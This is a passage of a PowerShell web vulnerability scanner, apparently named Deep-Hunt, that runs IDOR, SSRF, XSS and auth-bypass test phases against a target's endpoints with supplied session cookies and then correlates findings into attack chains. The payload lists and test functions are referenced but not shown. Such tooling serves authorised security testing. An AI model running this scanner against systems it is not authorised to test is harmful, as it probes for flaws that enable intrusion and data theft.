    $ssrfFindings = $AllFindings | Where-Object { $_.Type -eq 'SSRF' }
    $xssFindings = $AllFindings | Where-Object { $_.Type -eq 'XSS' }
    $authFindings = $AllFindings | Where-Object { $_.Type -eq 'AuthBypass' }

    $chainResults = @()

    # Chain: IDOR + Auth Bypass
    if ($idorFindings.Count -gt 0 -and $authFindings.Count -gt 0) {
        $chainResults += [PSCustomObject]@{
            Chain        = 'IDOR → AuthBypass'
            Components   = @('IDOR', 'AuthBypass')
            Severity     = 'Critical'
            Description  = "IDOR combined with auth bypass allows unauthorized access to data without proper authentication"
            IdorCount    = $idorFindings.Count
            AuthCount    = $authFindings.Count
        }
    }

    # Chain: SSRF + XSS
    if ($ssrfFindings.Count -gt 0 -and $xssFindings.Count -gt 0) {
        $chainResults += [PSCustomObject]@{
            Chain        = 'SSRF → XSS'
            Components   = @('SSRF', 'XSS')
            Severity     = 'Critical'
            Description  = "SSRF to internal service combined with XSS can lead to internal network compromise"
            SsrfCount    = $ssrfFindings.Count
            XssCount     = $xssFindings.Count
        }
    }

    # Chain: XSS + Auth Bypass
    if ($xssFindings.Count -gt 0 -and $authFindings.Count -gt 0) {
        $chainResults += [PSCustomObject]@{
            Chain        = 'XSS → AuthBypass'
            Components   = @('XSS', 'AuthBypass')
            Severity     = 'Critical'
            Description  = "XSS combined with auth bypass can lead to full account takeover"
            XssCount     = $xssFindings.Count
            AuthCount    = $authFindings.Count
        }
    }

    # Chain: IDOR + SSRF
    if ($idorFindings.Count -gt 0 -and $ssrfFindings.Count -gt 0) {
        $chainResults += [PSCustomObject]@{
            Chain        = 'IDOR → SSRF'
            Components   = @('IDOR', 'SSRF')
            Severity     = 'High'
            Description  = "IDOR allows SSRF parameter access, enabling internal network probing"
            IdorCount    = $idorFindings.Count
            SsrfCount    = $ssrfFindings.Count
        }
    }

    return $chainResults
}

# ============================================================================
# FUNCTION: Invoke-DeepHunt
# ============================================================================

function Invoke-DeepHunt {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [string]$Target,
        [string[]]$Endpoints,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [string]$OutputFile,
        [int]$Threads = 5,
        [int]$Timeout = 30,
        [string]$Phases = 'baseline,idor,ssrf,xss,auth,correlation',
        [string[]]$IdorPatterns,
        [string]$SsrfCallbackUrl,
        [string[]]$XssPayloads,
        [int]$RateLimit = 100,
        [switch]$Silent
    )
    if (-not $IdorPatterns) { $IdorPatterns = $Script:DefaultIdorPatterns }
    if (-not $XssPayloads) { $XssPayloads = $Script:DefaultXssPayloads }

    $phasesList = $Phases -split ',' | ForEach-Object { $_.Trim().ToLowerInvariant() }

    $output = [PSCustomObject]@{
        Tool      = 'Deep-Hunt'
        Timestamp = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ')
        Target    = $Target
        Phases    = $phasesList
        Findings  = @()
        Stats     = $null
        Errors    = @()
    }
    $allFindings = [System.Collections.Generic.List[PSCustomObject]]::new()
    $errors = [System.Collections.Generic.List[string]]::new()

    if (-not $Endpoints -or $Endpoints.Count -eq 0) {
        $errors.Add('No endpoints provided for testing')
        $output.Errors = $errors
        return $output
    }

    foreach ($endpoint in $Endpoints) {
        $fullUrl = Build-FullUrl -Target $Target -Endpoint $endpoint
        if (-not $Silent) { Write-Output "=== Testing: $fullUrl ===" }

        # Phase 1: Baseline
        if ('baseline' -in $phasesList) {
            Write-Verbose "Phase 1: Baseline for $fullUrl"
            $baseline = Get-BaselineResponse -Url $fullUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $Timeout
            if (-not $baseline.Success) {
                $errors.Add("Baseline failed for $fullUrl - $($baseline.ErrorMessage)")
                continue
            }
            if (-not $Silent) { Write-Output "  Baseline: Status $($baseline.StatusCode), Size $($baseline.ContentLength), Timing $($baseline.TimingMs)ms" }
        }
        else {
            $baseline = Get-BaselineResponse -Url $fullUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $Timeout
        }

        # Phase 2: IDOR
        if ('idor' -in $phasesList) {
            Write-Verbose "Phase 2: IDOR testing for $fullUrl"
            $idorFindings = Test-Idor -Url $fullUrl -Cookies $Cookies -Headers $Headers -Baseline $baseline -IdorPatterns $IdorPatterns -TimeoutSec $Timeout -RateLimitMs $RateLimit
            foreach ($f in $idorFindings) { $allFindings.Add($f) }
            if (-not $Silent -and $idorFindings.Count -gt 0) { Write-Output "  IDOR: $($idorFindings.Count) finding(s)" }
        }

        # Phase 3: SSRF
        if ('ssrf' -in $phasesList) {
            Write-Verbose "Phase 3: SSRF testing for $fullUrl"
            $ssrfFindings = Test-Ssrf -Url $fullUrl -Cookies $Cookies -Headers $Headers -Baseline $baseline -CallbackUrl $SsrfCallbackUrl -TimeoutSec $Timeout -RateLimitMs $RateLimit
            foreach ($f in $ssrfFindings) { $allFindings.Add($f) }
            if (-not $Silent -and $ssrfFindings.Count -gt 0) { Write-Output "  SSRF: $($ssrfFindings.Count) finding(s)" }
        }

        # Phase 4: XSS
        if ('xss' -in $phasesList) {
            Write-Verbose "Phase 4: XSS testing for $fullUrl"
            $xssFindings = Test-Xss -Url $fullUrl -Cookies $Cookies -Headers $Headers -Baseline $baseline -XssPayloads $XssPayloads -TimeoutSec $Timeout -RateLimitMs $RateLimit
            foreach ($f in $xssFindings) { $allFindings.Add($f) }
            if (-not $Silent -and $xssFindings.Count -gt 0) { Write-Output "  XSS: $($xssFindings.Count) finding(s)" }
        }

        # Phase 5: Auth Bypass
        if ('auth' -in $phasesList) {
            Write-Verbose "Phase 5: Auth Bypass testing for $fullUrl"
            $authFindings = Test-AuthBypass -Url $fullUrl -Cookies $Cookies -Headers $Headers -Baseline $baseline -TimeoutSec $Timeout -RateLimitMs $RateLimit
            foreach ($f in $authFindings) { $allFindings.Add($f) }
            if (-not $Silent -and $authFindings.Count -gt 0) { Write-Output "  Auth Bypass: $($authFindings.Count) finding(s)" }
        }
    }

    # Phase 6: Correlation
    $chains = @()
    if ('correlation' -in $phasesList -and $allFindings.Count -gt 1) {
        Write-Verbose 'Phase 6: Cross-correlation analysis'
        $chains = Invoke-CorrelationAnalysis -AllFindings $allFindings
        if (-not $Silent -and $chains.Count -gt 0) {
            Write-Output "  Chains: $($chains.Count) possible chain(s)"
            foreach ($chain in $chains) { Write-Output "    $($chain.Chain) - $($chain.Severity)" }
        }
    }

    $output.Findings = $allFindings
    $output.Chains = $chains
    $output.Stats = [PSCustomObject]@{
        TotalEndpoints = $Endpoints.Count
        TotalFindings  = $allFindings.Count
        IdorFindings   = ($allFindings | Where-Object { $_.Type -eq 'IDOR' }).Count
        SsrfFindings   = ($allFindings | Where-Object { $_.Type -eq 'SSRF' }).Count
        XssFindings    = ($allFindings | Where-Object { $_.Type -eq 'XSS' }).Count
        AuthFindings   = ($allFindings | Where-Object { $_.Type -eq 'AuthBypass' }).Count
        Chains         = $chains.Count
    }
    $output.Errors = $errors

    if ($OutputFile) {
        $outputDir = Split-Path -Parent $OutputFile
        if ($outputDir -and -not (Test-Path -LiteralPath $outputDir)) {
            New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
        }
        $output | ConvertTo-Json -Depth 10 | Out-File -LiteralPath $OutputFile -Encoding utf8
        if (-not $Silent) { Write-Output "[+] Results written to $OutputFile" }
    }

    if (-not $Silent) {
        Write-Output "=== Deep Hunt Summary ==="
        Write-Output "Endpoints Tested: $($output.Stats.TotalEndpoints)"
        Write-Output "Total Findings: $($output.Stats.TotalFindings)"
        Write-Output "  IDOR: $($output.Stats.IdorFindings)"
        Write-Output "  SSRF: $($output.Stats.SsrfFindings)"
        Write-Output "  XSS: $($output.Stats.XssFindings)"
        Write-Output "  Auth Bypass: $($output.Stats.AuthFindings)"
        Write-Output "  Chains: $($output.Stats.Chains)"
        if ($errors.Count -gt 0) { Write-Output "Errors: $($errors.Count)" }
    }

    return $output
}

# ============================================================================
# MAIN ENTRY
# ============================================================================

$Target = $null; $Endpoints = $null; $Cookies = $null; $Headers = $null
$OutputFile = $null; $Threads = 5; $Timeout = 30; $Phases = 'baseline,idor,ssrf,xss,auth,correlation'
$IdorPatterns = $null; $SsrfCallbackUrl = $null; $XssPayloads = $null
$RateLimit = 100; $Silent = $false
$endpointList = [System.Collections.Generic.List[string]]::new()

if ($args.Count -gt 0) {
    $i = 0; while ($i -lt $args.Count) {
        switch -Wildcard ($args[$i]) {
            '-Target' { $i++; $Target = $args[$i] }
            '-Endpoints' { $i++; $Endpoints = $args[$i] -split ','; foreach ($e in $Endpoints) { $endpointList.Add($e.Trim()) } }
            '-Cookies' { $i++; $Cookies = $args[$i] | ConvertFrom-Json -AsHashtable }
            '-Headers' { $i++; $Headers = $args[$i] | ConvertFrom-Json -AsHashtable }
            '-OutputFile' { $i++; $OutputFile = $args[$i] }
            '-Threads' { $i++; $Threads = [int]$args[$i] }
            '-Timeout' { $i++; $Timeout = [int]$args[$i] }
            '-Phases' { $i++; $Phases = $args[$i] }
            '-IdorPatterns' { $i++; $IdorPatterns = $args[$i] -split ',' }
            '-SsrfCallbackUrl' { $i++; $SsrfCallbackUrl = $args[$i] }
            '-XssPayloads' { $i++; $XssPayloads = $args[$i] -split ',' }
            '-RateLimit' { $i++; $RateLimit = [int]$args[$i] }
            '-Silent' { $Silent = $true }
        }
        $i++
    }
}

if (-not $Endpoints -and $endpointList.Count -gt 0) { $Endpoints = $endpointList }

try {
    Invoke-DeepHunt -Target $Target -Endpoints $Endpoints -Cookies $Cookies -Headers $Headers -OutputFile $OutputFile -Threads $Threads -Timeout $Timeout -Phases $Phases -IdorPatterns $IdorPatterns -SsrfCallbackUrl $SsrfCallbackUrl -XssPayloads $XssPayloads -RateLimit $RateLimit -Silent:$Silent
}
catch {
    Write-Error "Unhandled exception: $($_.Exception.Message)"
    exit 1
}
